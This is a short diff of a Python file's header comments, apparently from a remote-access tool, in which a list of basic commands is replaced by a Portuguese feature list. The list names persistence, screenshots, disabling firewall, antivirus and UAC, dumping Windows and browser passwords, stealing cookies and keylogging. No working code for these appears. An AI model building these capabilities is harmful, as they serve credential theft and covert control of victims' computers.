@@ -3,12 +3,17 @@
 # by Tarcisio marinho
 # github.com/tarcisio-marinho
 
-# programas padrao
-# ls
-# mkdir
+# funcionalidades
+# persistencia
 # upload
 # copiar arquivos
 # copiar pasta
+# screenshot
+# desabilitar firewall / antivirus
+# desabilitar UAC
+# dump de senhas windows, google chrome, internet explorer
+# steal cookies
+# keylogger
 
 import os
 import datetime
